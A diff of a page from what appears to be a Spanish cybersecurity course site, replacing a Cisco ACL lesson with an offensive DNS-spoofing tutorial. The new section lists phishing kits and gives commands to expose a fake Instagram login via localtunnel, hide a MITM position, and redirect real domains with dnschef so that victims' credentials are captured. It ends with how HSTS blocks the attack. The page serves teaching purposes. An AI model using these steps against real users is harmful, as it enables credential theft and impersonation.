@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://salvasevero.github.io/ciber/A_CiscoACL.html">
+        <link rel="canonical" href="https://salvasevero.github.io/ciber/37_DNS_Spoofing.html">
       
       
-        <link rel="prev" href="A_ComandosNAT.html">
+        <link rel="prev" href="36_DHCP_Spoofing.html">
       
       
-        <link rel="next" href="A_CiscoSSH.html">
+        <link rel="next" href="26_UDP.html">
       
       
       <link rel="icon" href="assets/images/favicon.png">
@@ -22,7 +22,7 @@
     
     
       
-        <title>ACL - CiberSeguridad Redes.</title>
+        <title>Spoofing - CiberSeguridad Redes.</title>
       
     
     
@@ -76,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#cisco-acl" class="md-skip">
+        <a href="#dns-spoofing" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -111,7 +111,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              ACL
+              Spoofing
             
           </span>
         </div>
@@ -503,8 +503,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -526,11 +528,11 @@
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
@@ -546,7 +548,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             OFENSIVA
@@ -778,8 +780,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -789,11 +793,11 @@
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
         
           
           <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
@@ -809,7 +813,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_3">
             <span class="md-nav__icon md-icon"></span>
             DNS
@@ -820,10 +824,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="37_DNS_Spoofing.html" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Spoofing
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="37_DNS_Spoofing.html" class="md-nav__link md-nav__link--active">
         
   
   
@@ -834,6 +860,98 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objetivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objetivo.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phishing-online" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phishing Online.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#servicios-externos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Servicios Externos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuracion-dns-spoofing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuración DNS Spoofing.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#suplantar-un-dominio-que-no-existe" class="md-nav__link">
+    <span class="md-ellipsis">
+      Suplantar un dominio que no existe.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#suplantar-un-dominio-que-existe-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      Suplantar un dominio que existe http.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#suplantar-un-dominio-que-existe-con-https-sin-hsts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Suplantar un dominio que existe con https sin HSTS.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hsts-http-strict-transport-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      HSTS (HTTP Strict Transport Security).
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1647,10 +1765,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -1670,11 +1786,11 @@
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
@@ -1690,7 +1806,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             ANEXO
@@ -1770,10 +1886,8 @@
                 
   
   
-    
   
   
-  
     
     
       
@@ -1791,11 +1905,11 @@
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
         
           
           <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
@@ -1811,7 +1925,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4_4">
             <span class="md-nav__icon md-icon"></span>
             Comandos Cisco
@@ -1891,32 +2005,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    ACL
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="A_CiscoACL.html" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="A_CiscoACL.html" class="md-nav__link">
         
   
   
@@ -1927,62 +2019,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Tabla de contenidos
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#configuracion-acl-standard" class="md-nav__link">
-    <span class="md-ellipsis">
-      Configuración ACL Standard:
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#configuracion-basica-acl-extendida" class="md-nav__link">
-    <span class="md-ellipsis">
-      Configuración Básica ACL Extendida.
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#aplicar-el-filtro-en-los-puertos" class="md-nav__link">
-    <span class="md-ellipsis">
-      Aplicar el filtro en los puertos.
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#modoficar-una-acl" class="md-nav__link">
-    <span class="md-ellipsis">
-      Modoficar una ACL.
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2238,122 +2274,211 @@
 
 
 
-<div><h1 id="cisco-acl">Cisco ACL.<a class="headerlink" href="#cisco-acl" title="Permanent link">¶</a></h1>
-<p>El funcionamiento es exactamente igual en cualquier fabricante.</p>
-<p>Lo único a tener en cuenta es que en Cisco existen <ins class="critic">dos tipos de ACL</ins>:</p>
-<ul>
-<li>
-<p>ACL standard.</p>
-<p>💥   No llevan nombre, se pueden numerar del 1-99 o del 1300-1999.</p>
-<p>💥 Solo permite filtrar por IP origen.</p>
-</li>
-<li>
-<p>ACL extendidas.</p>
-<p>💥   Pueden llevar nombres o un número entre 100-199 o 2000-2699.</p>
-<p>💥   Puede filtrar por origen/destino.</p>
-<p>💥   Puede filtrar por protocolo / puerto de conexiones específicas.</p>
-<p>💥   Es más fácil editar las ACL extendidas.</p>
-</li>
-</ul>
+<div><h1 id="dns-spoofing">DNS Spoofing.<a class="headerlink" href="#dns-spoofing" title="Permanent link">¶</a></h1>
+<h2 id="objetivo">Objetivo.<a class="headerlink" href="#objetivo" title="Permanent link">¶</a></h2>
+<p>Vamos a redireccionar las peticiones DNS de la víctima hacia otros dominios.</p>
 <div class="admonition tip">
-<p class="admonition-title">ACL STANDARD</p>
-<p>Por norma general no tiene mucho sentido usar ACL standard al no ser que sea algo extremadamente sencillo y que no vaya a cambiar en el tiempo.</p>
+<p class="admonition-title">Se presupondrá que hemos realizado un ataque MITM para poder capturar el tráfico de la víctima y modificarlo.</p>
 </div>
-<h2 id="configuracion-acl-standard">Configuración ACL Standard:<a class="headerlink" href="#configuracion-acl-standard" title="Permanent link">¶</a></h2>
-<center><mark class="critic">access-list X [deny | permit | remark ] [ network | any | host ] [ log ]</mark></center>
+<h2 id="phishing-online">Phishing Online.<a class="headerlink" href="#phishing-online" title="Permanent link">¶</a></h2>
+<ul>
+<li>
+<p>Existen muchas herramientas para recrear páginas web conocidas:</p>
+<p>🔥 shellphish.</p>
+<p>🔥 Hiddeneye.</p>
+<p>🔥 Hiddeneye reborn.</p>
+<p>🔥 Setoolkit</p>
+<p>🔥 zphisher.</p>
+<p>🔥 BlackPhish.</p>
+</li>
+</ul>
+<p>En github podemos buscar dichos scripts y ordenarlos por más recientes, viendo el número de estrellas (valoración), etc. </p>
+<figure>
+  <img src="imagenes/ofensiva/114.png" width="800">
+</figure>
+
+<h2 id="servicios-externos">Servicios Externos<a class="headerlink" href="#servicios-externos" title="Permanent link">¶</a></h2>
+<ul>
+<li>
+<p>Servicios como <strong>ngrok, serveo o localtunnel</strong> permitían <mark class="critic"><strong>publicar nuestras páginas locales a Internet de forma anónima</strong></mark>. </p>
+</li>
+<li>
+<p>Esto permitió una facilidad de exponer páginas de <strong>phishing</strong> que llevó a una gran cantidad de <strong>denuncias</strong> que siempre tenían por medio a estas plataformas intermedias. Esto acabó por tener diferentes repercusiones en las plataformas:</p>
+<p>🔥 <strong>Ngrok</strong>: Es obligatorio registrarse, por lo que al ejecutar ngrok desde un script de phishing nos devolverá error, pues no irá autentificado con un usuario/contraseña:</p>
+<div class="admonition tip">
+<p class="admonition-title">Se puede instalar mediante la info en el siguiente enlace: https://ngrok.com/download.</p>
+</div>
+<p><figure>
+<img src="imagenes/ofensiva/120.png" width="700">
+</figure></p>
+<p>🔥 <strong>Serveo</strong>: A día de hoy su servicio sigue caído.</p>
+<p>🔥 <strong>LocalTunnel</strong>: Permite la redirección sin registrarse, pero muestra una pantalla de aviso.</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1">#Instalación.</span>
+sudo<span class="w"> </span>apt<span class="w"> </span>update
+sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>nodejs<span class="w"> </span>npm<span class="w"> </span>
+npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>localtunnel
+<span class="c1">#Ejemplo de exponer una web local en el puerto 5555</span>
+lt<span class="w"> </span>--port<span class="w"> </span><span class="m">5555</span>
+<span class="c1">#Mismo ejemplo pero generando el subdominio https://instagram.loca.lt</span>
+lt<span class="w"> </span>--port<span class="w"> </span><span class="m">5555</span><span class="w"> </span>--subdomain<span class="w"> </span>instagram
+</code></pre></div>
+<figure>
+  <img src="imagenes/ofensiva/119.png" width="800">
+</figure>
+
+<div class="admonition important">
+<p class="admonition-title">Por tanto una posibilidad sería levantarlo en un servidor web propio.</p>
+</div>
+<h3 id="ejemplo-de-pagina-de-phishing-con-ngrok">Ejemplo de página de phishing con NGROK.<a class="headerlink" href="#ejemplo-de-pagina-de-phishing-con-ngrok" title="Permanent link">¶</a></h3>
+<div class="admonition danger">
+<p class="admonition-title">Este ataque ya no es funcional debido a bloqueos a ngrok que obligaron a cambiar su política.</p>
+</div>
+<figure>
+  <img src="imagenes/ofensiva/115.png" width="600">
+</figure>
+
+<p>Seleccionamos que genere una web tipo Instagram. </p>
+<ul>
+<li>Es importante apreciar que nos aporta la web a donde debe acceder la página para realizar el phishing.</li>
+</ul>
+<figure>
+  <img src="imagenes/ofensiva/116.png" width="500">
+</figure>
+
+<figure>
+  <img src="imagenes/ofensiva/117.png" width="700">
+</figure>
 
 <ul>
 <li>
-<p><strong>X</strong>: Hace referencia al número identificativo de la ACL.</p>
-</li>
-<li>
-<p><strong>[ deny | permit |remark ]</strong>: Indica que hará si encuentra una ocurrencia (match), si lo permite o lo deniega. En el caso de remark es simplemente un comentario informativo, por ejemplo para indicar que hace la línea de la ACL.</p>
-</li>
-<li>
-<p><strong>[ network | any | host ]</strong>: A quién afecta dicha ACL, a una red de equipos, a cualquiera o a un host. </p>
-<p>💥 <strong>Network</strong> siempre va asociado de una <ins class="critic">wildcard</ins> (máscara inversa).</p>
-<p><figure>
-  <img src="imagenes/warmup/92.png" width="400">
-</figure></p>
-<p><figure>
-  <img src="imagenes/warmup/93.png" width="400">
-</figure></p>
-<p>💥 <strong>Any</strong>: Simplemente afecta a cualquiera.</p>
-<p><figure>
-  <img src="imagenes/warmup/94.png" width="300">
-</figure></p>
-<p>💥 <strong>Host</strong>: Afecta un equipo en concreto.</p>
-<p><figure>
-  <img src="imagenes/warmup/95.png" width="400">
-</figure></p>
-</li>
-<li>
-<p><strong>Log</strong>: Simplemente registra cada vez que hay un match debido a esa regla en concreto. No es muy recomendable al no ser que sea algo muy importante de lo que queramos visibilidad. El problema es que consume CPU y memoria.</p>
+<p>En caso de que la víctima introdujera sus credenciales ocurrirían dos cosas:</p>
+<p>🔥 Obtendríamos dichas credenciales.</p>
+<p>🔥 La víctima sería redirigida a la página de Instagram real para que no sospechase nada.</p>
 </li>
 </ul>
-<h2 id="configuracion-basica-acl-extendida">Configuración Básica ACL Extendida.<a class="headerlink" href="#configuracion-basica-acl-extendida" title="Permanent link">¶</a></h2>
-<center><mark class="critic">ip access-list extended [ NOMBRE | NÚMERO ] [ permit | deny | remark ] protocol [ host | network | any ] [ host | network | any ] [ eq puerto ] </mark></center>
-
-<h3 id="ejemplo-1">Ejemplo 1.<a class="headerlink" href="#ejemplo-1" title="Permanent link">¶</a></h3>
 <figure>
-  <img src="imagenes/warmup/96.png" width="400">
+  <img src="imagenes/ofensiva/118.png" width="600">
 </figure>
 
-<h3 id="ejemplo-2">Ejemplo 2.<a class="headerlink" href="#ejemplo-2" title="Permanent link">¶</a></h3>
-<div class="highlight"><pre><span></span><code>ip access-list extended ACL-PROTECT-OUT
- deny   tcp any any fragments
- deny   udp any any fragments
- deny   icmp any any fragments
- deny   ip any any fragments
- deny   tcp any any eq www
- deny   udp any any eq domain
- deny   tcp any any eq domain
- permit ip any any
+<h2 id="configuracion-dns-spoofing">Configuración DNS Spoofing.<a class="headerlink" href="#configuracion-dns-spoofing" title="Permanent link">¶</a></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Comprobar que nuestro equipo tiene permitido redirigir tráfico de terceros.</span>
+<span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/net/ipv4/ip_forward
+<span class="c1"># Se puede comprobar con:</span>
+sysctl<span class="w"> </span>net.ipv4.ip_forward
+<span class="c1"># Deshabilitar el aviso de las redirecciones, para evitar informar a la víctima que puede enviar el tráfico directamente a la puerta de enlace como ruta más directa.</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.conf.all.send_redirects<span class="o">=</span><span class="m">0</span>
+<span class="c1"># El último paso sería configurar nuestro servicio DNS para que la víctima navegase de forma normal, pero cuando accediese, por ejemplo a Instagram, fuese redirigida a nuestra web falsa del punto anterior.</span>
+dnschef<span class="w"> </span>-i<span class="w"> </span>IP_INTERFAZ_RED<span class="w"> </span>--fakedomains<span class="w"> </span>instagram.com<span class="w"> </span>--fakeip<span class="w"> </span>IP_DOMINIO_WEB_PHISHING
 </code></pre></div>
-<h3 id="ejemplo-2_1">Ejemplo 2.<a class="headerlink" href="#ejemplo-2_1" title="Permanent link">¶</a></h3>
-<div class="highlight"><pre><span></span><code>ip access-list extended ACL_PROTECT
- deny   tcp any any fragments
- deny   udp any any fragments
- deny   icmp any any fragments
- deny   ip any any fragments
- permit icmp 192.168.123.0 0.0.0.255 any echo
- permit ip 192.168.123.0 0.0.0.255 any
- permit ip 84.232.0.0 0.0.0.255 any
- permit ip 77.123.0.0 0.0.0.255 any
- deny   ip any any
+<ul>
+<li>En la IP de Phishing podemos levantar nuestro propio servicio de phishing o de terceros.</li>
+</ul>
+<div class="highlight"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/iinc0gnit0/BlackPhish
+sudo<span class="w"> </span>./install.sh
+sudo<span class="w"> </span>python3<span class="w"> </span>blackphish.py
 </code></pre></div>
-<h2 id="aplicar-el-filtro-en-los-puertos">Aplicar el filtro en los puertos.<a class="headerlink" href="#aplicar-el-filtro-en-los-puertos" title="Permanent link">¶</a></h2>
-<p>Una vez creado los filtros es necesarios aplicarlos en las interfaces.</p>
-<div class="admonition warning">
-<p class="admonition-title">IN/OUT</p>
-<p>Es muy importante ser consciente de que los filtros se pueden aplicar para el <ins class="critic">tráfico saliente o entrante</ins>.</p>
+<h2 id="suplantar-un-dominio-que-no-existe">Suplantar un dominio que no existe.<a class="headerlink" href="#suplantar-un-dominio-que-no-existe" title="Permanent link">¶</a></h2>
+<ul>
+<li>Vamos a hacer un ejemplo con el dominio <strong>instagrami.com</strong> imitando una página de instagram.com.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1">#Lanzamos la página de phishing de Instagram en localhost.</span>
+sudo<span class="w"> </span>python3<span class="w"> </span>blackphish.py
+<span class="c1">#Generamos el dnschef</span>
+dnschef<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.10.200<span class="w"> </span>--fakedomains<span class="w"> </span>instagrami.com<span class="w"> </span>--fakeip<span class="w"> </span><span class="m">192</span>.168.10.200
+</code></pre></div>
+<ul>
+<li>Comprobamos que funciona correctamente, por lo que podríamos sustraer las credenciales del usuario.</li>
+</ul>
+<figure>
+  <img src="imagenes/ofensiva/121.png" width="600">
+</figure>
+
+<h2 id="suplantar-un-dominio-que-existe-http">Suplantar un dominio que existe http.<a class="headerlink" href="#suplantar-un-dominio-que-existe-http" title="Permanent link">¶</a></h2>
+<ul>
+<li>Vamos a suplantar una web existente pero con protocolo inseguro HTTP: http://httpforever.com/</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1">#Lanzamos la página de phishing de Instagram en localhost.</span>
+sudo<span class="w"> </span>python3<span class="w"> </span>blackphish.py
+<span class="c1">#Generamos el dnschef</span>
+dnschef<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.10.200<span class="w"> </span>--fakedomains<span class="w"> </span>httpforever.com<span class="w"> </span>--fakeip<span class="w"> </span><span class="m">192</span>.168.10.200
+</code></pre></div>
+<ul>
+<li>Comprobamos que funciona correctamente, por lo que podríamos sustraer las credenciales del usuario.</li>
+</ul>
+<figure>
+  <img src="imagenes/ofensiva/122.png" width="600">
+</figure>
+
+<h2 id="suplantar-un-dominio-que-existe-con-https-sin-hsts">Suplantar un dominio que existe con https sin HSTS.<a class="headerlink" href="#suplantar-un-dominio-que-existe-con-https-sin-hsts" title="Permanent link">¶</a></h2>
+<h3 id="comprobar-si-una-web-tiene-hsts">Comprobar si una web tiene HSTS.<a class="headerlink" href="#comprobar-si-una-web-tiene-hsts" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">#Si devuelve algo es que tiene HSTS activado</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-D-<span class="w"> </span>https://DOMINIO<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>strict
+</code></pre></div>
+<h3 id="https-sin-redirecciones-desde-http">HTTPS sin redirecciones desde HTTP.<a class="headerlink" href="#https-sin-redirecciones-desde-http" title="Permanent link">¶</a></h3>
+<ul>
+<li>Cuando solicitamos una web, aunque sea https, si no tiene HSTS podremos acceder a http://ejemplo.com en vez de forzarnos a usar https.</li>
+</ul>
+<h3 id="https-con-redirecciones-desde-http">HTTPS con redirecciones desde HTTP.<a class="headerlink" href="#https-con-redirecciones-desde-http" title="Permanent link">¶</a></h3>
+<ul>
+<li>En caso de tener una <strong>redirección</strong> a su https para las peticiones http nos daría un error, no obstante si pusieramos un certificado nuestro en nuestra web falsa este error sería salvable.</li>
+</ul>
+<figure>
+  <img src="imagenes/ofensiva/125.png" width="700">
+</figure>
+
+<ul>
+<li>Comprobamos que funciona correctamente, por lo que podríamos sustraer las credenciales del usuario.</li>
+</ul>
+<div class="admonition important">
+<p class="admonition-title">HTTPS.</p>
+<p>En caso de lanzar nuestra web de phishing en https el tráfico irá cifrado, pero como seremos el extremo contra el que se realiza el cifrado podremos descifrar el tráfico con la clave privada y almacenar la información. </p>
+<p><a href="https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/">Incluso podemos descifrarla con wireshark</a>.</p>
 </div>
-<div class="highlight"><pre><span></span><code>interface FastEthernet0/0
- description LAN
-ip address 84.232.0.1 255.255.255.0
- ip access-group ACL-PROTECT in
- ip access-group ACL-PROTECT-OUT out
-</code></pre></div>
-<h2 id="modoficar-una-acl">Modoficar una ACL.<a class="headerlink" href="#modoficar-una-acl" title="Permanent link">¶</a></h2>
-<p>Podemos comprobar que se le asigna un número a cada línea del filtro ACL.</p>
+<h2 id="hsts-http-strict-transport-security">HSTS (HTTP Strict Transport Security).<a class="headerlink" href="#hsts-http-strict-transport-security" title="Permanent link">¶</a></h2>
+<ul>
+<li>
+<p>Con HSTS <ins class="critic"><strong>el navegador no permite conexión HTTP</strong></ins> al dominio directamente.</p>
+</li>
+<li>
+<p>Los sitios pueden unirse a la <strong>HSTS Preload List</strong>. </p>
+<p>🔥 Una lista incluida en Chrome, Firefox, Edge, Safari donde se indica qué dominio tiene HSTS y cuál es su certificado.</p>
+<p>🔥 Imposibilita un ataque de suplantación aunque sea la primera vez que accede a la web desde dicho navegador.</p>
+<p>🔥 En caso de no estar en la lista, pero tener activado HSTS, el navegador los incluye tras la primera visita.</p>
+</li>
+</ul>
 <figure>
-  <img src="imagenes/warmup/97.png" width="400">
+  <img src="imagenes/ofensiva/123.png" width="1200">
 </figure>
 
-<p>Por tanto podemos añadir reglas entre dichos números.</p>
+<ul>
+<li>
+<p>Evita SSL Stripping.</p>
+</li>
+<li>
+<p>Evita accesos que expongan cookies, sesiones o credenciales.</p>
+</li>
+</ul>
+<div class="admonition danger">
+<p class="admonition-title">Por tanto al no estar cifrada nuestra página de phishing devuelve un error de comunicación.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">HTTPS</p>
+<p>Aunque usáramos un certificado en nuestra página de phishing no funcionaría pues no casaría con el que tiene ya preconfigurado en HSTS Preload List.</p>
+</div>
+<p>Con WireShark podemos ver mejor cómo el error se comete porque el cliente intenta realizar una conexión al servidor web mediante TLS. </p>
+<details class="question">
+<summary>¿Por qué el navegador intenta entablar una conexión TLS cuando nuestras web no tienen cifrado y nosotros no le hemos dicho que conecte a HTTPS?</summary>
+<p>Debido a HSTS que le obliga a usar HTTPS, el navegador ignora nuestra petición de HTTP directamente.</p>
+</details>
 <figure>
-  <img src="imagenes/warmup/98.png" width="400">
+  <img src="imagenes/ofensiva/124.png" width="1000">
 </figure>
 
-<p>Para comprobar que se ha añadido la nueva regla dentro del filtro.</p>
-<figure>
-  <img src="imagenes/warmup/99.png" width="400">
-</figure>
-
-<div class="admonition note">
-<p class="admonition-title">MODIFICAR ACL</p>
-<p>También se puede modificar o susituir una regla ya creada.</p>
-<p>Para eliminar una línea basta con hacer "no X", donde X es la línea a elimninar.</p>
+<div class="admonition important">
+<p class="admonition-title">AVISO.</p>
+<p>Recuerda para saber si un dominio tiene HSTS activado: <strong>curl -s -D- https://example.com | grep -i strict-transport-security</strong>.</p>
 </div></div>
 
 
